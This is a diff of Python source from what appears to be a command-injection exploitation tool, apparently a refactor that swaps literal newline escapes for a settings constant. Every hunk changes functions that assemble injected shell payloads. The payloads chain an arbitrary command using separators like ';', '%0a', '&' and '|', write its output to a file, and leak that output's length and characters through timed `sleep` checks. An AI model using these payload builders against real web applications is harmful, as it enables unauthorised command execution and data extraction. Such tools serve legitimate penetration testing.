@@ -80,7 +80,7 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, timesec, http_request_method):
       payload = (pipe +
                 "echo " + TAG + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + pipe +
                 "[ " + str(j) + " -ne " + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE +
-                pipe + "tr -d '\\n'" +
+                pipe + "tr -d '" + settings.END_LINE.ESCAPED_LF + "'" +
                 pipe + "wc -c) ] " + separator +
                 "sleep " + str(timesec)
                 )
@@ -203,7 +203,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
     settings.USER_APPLIED_CMD = cmd
     if separator in (";", "%0a") :
       payload = (separator +
-                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + " tr '\\n' ' ' < " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
+                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + " tr '" + settings.END_LINE.ESCAPED_LF + "' ' ' < " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 "echo $" + settings.RANDOM_VAR_GENERATOR + " > " + OUTPUT_TEXTFILE + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output.
@@ -222,7 +222,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
       ampersand = _urllib.parse.quote("&")
       payload = (ampersand +
                 "sleep 0 " + separator +
-                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + " tr -d '\\n'<" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
+                settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator + " tr -d '" + settings.END_LINE.ESCAPED_LF + "' <" + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 "echo $" + settings.RANDOM_VAR_GENERATOR + "" + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + separator +
                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + settings.CMD_SUB_SUFFIX + separator +
                 # Find the length of the output.
@@ -242,7 +242,7 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, timesec, http_request_meth
       payload = (pipe +
                 cmd + settings.FILE_WRITE_OPERATOR + OUTPUT_TEXTFILE + pipe +
                 "[ " + str(j) + " -ne " + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE + pipe +
-                "tr -d '\\n'" + pipe + "wc -c) ]" + separator +
+                "tr -d '" + settings.END_LINE.ESCAPED_LF + "'" + pipe + "wc -c) ]" + separator +
                 "sleep " + str(timesec)
                 )
     else:
@@ -372,7 +372,7 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http
       pipe = "|"
       payload = (pipe +
                 "[ " + str(ascii_char) + " -ne " + settings.CMD_SUB_PREFIX + "cat " + OUTPUT_TEXTFILE +
-                pipe + "tr -d '\\n'" +
+                pipe + "tr -d '" + settings.END_LINE.ESCAPED_LF + "'" +
                 pipe + "cut -c " + str(num_of_chars) +
                 pipe + "od -N 1 -i" +
                 pipe + "head -1" +
